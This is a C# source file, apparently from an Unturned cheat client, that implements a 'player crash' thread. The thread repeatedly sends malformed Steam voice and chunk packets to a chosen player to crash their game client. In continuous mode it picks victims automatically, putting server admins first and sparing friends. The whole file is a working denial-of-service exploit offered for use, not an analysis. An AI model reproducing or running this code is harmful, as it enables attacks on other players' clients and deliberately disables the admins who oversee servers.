﻿using System.Linq;
using System.Reflection;
using System.Threading;
using SDG.Unturned;
using Steamworks;    
using Thanking.Attributes;
 using Thanking.Options;
 using Thanking.Utilities;
 using Thanking.Variables;
 using UnityEngine;

namespace Thanking.Threads
{
    public static class PlayerCrashThread
    {
        public static bool PlayerCrashEnabled;
        public static bool ContinuousPlayerCrash;
        public static CSteamID CrashTarget;
        
        [Thread]
        public static void Start()
        {
            Thread.Sleep(5000);
            #if DEBUG
			DebugUtilities.Log("Player Crash Thread Started");
			#endif
            Provider.onEnemyDisconnected += OnDisconnect;

            byte[] P1 = { (byte)ESteamPacket.UPDATE_UNRELIABLE_CHUNK_INSTANT, 255, 255 };
            byte[] P2 = { (byte)ESteamPacket.UPDATE_VOICE, 255, 255 };
            byte[] P3 = { (byte)ESteamPacket.UPDATE_UNRELIABLE_BUFFER, 0, 0 };
            byte[] P4 = { (byte)ESteamPacket.UPDATE_VOICE, 0, 0 };
            byte[] P5 = { (byte)ESteamPacket.UPDATE_UNRELIABLE_CHUNK_INSTANT, 0, 0 };
            
            int S1 = 3;
            int S2 = 3;
            int S3 = 3;
            int S4 = 3;
            int S5 = 3;
            
            while (true)
            {
                if (PlayerCrashEnabled)
                {
                    switch (MiscOptions.PCrashMethod)
                    {
                        case 1:
                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P1, S1, 0);
                            break;
                        case 2:    
                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P2, S2, 0);
                            break;
                        case 3:
                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P3, S3, 0);
                            break;
                        case 4:
                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P4, S4, 0);
                            break;
                        case 5:
                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P5, S5, 0);
                            break;
                    }
                }
                
                else
                {
                    Thread.Sleep(1000);
                    if (!ContinuousPlayerCrash || Provider.clients.Count == 0)
                        continue;

                    PlayerCrashEnabled = true;
                    Thread.Sleep(1000);
                    
                    CrashTarget = Provider.clients.OrderBy(p => p.isAdmin ? 0 : 1)
                        .First(p => !FriendUtilities.IsFriendly(p.player)).playerID.steamID;
                }
            }
        }

        public static void OnDisconnect(SteamPlayer player)
        {
            if (player.playerID.steamID == CrashTarget)
            {
                if (!ContinuousPlayerCrash)
                    PlayerCrashEnabled = false;
                
                else
                    CrashTarget = Provider.clients.OrderBy(p => p.isAdmin ? 0 : 1)
                        .First(p => p.playerID.steamID != CrashTarget && !FriendUtilities.IsFriendly(p.player)).playerID.steamID;
            }
        }  
    }
}
